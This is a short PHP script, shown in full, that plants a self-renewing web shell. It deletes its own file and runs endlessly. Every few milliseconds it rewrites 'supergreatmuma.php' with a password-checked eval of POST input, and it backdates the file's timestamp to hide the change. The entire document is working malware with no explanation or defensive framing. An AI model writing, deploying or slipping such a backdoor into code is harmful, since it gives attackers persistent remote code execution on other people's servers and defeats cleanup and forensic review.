<?php
    ignore_user_abort(true);
    set_time_limit(0);
    @unlink(__FILE__);
    $file = 'supergreatmuma.php';
    $code = '<?php if(md5($_GET["pass"])=="7a8774d405dff76d39a2a53add1e9127"){@eval($_POST[1]);}?>';
    while (1){
        file_put_contents($file,$code);
        system('touch -m -d "2022-11-01 09:10:12" supergreatmuma.php');
        usleep(2000);
    }
?>
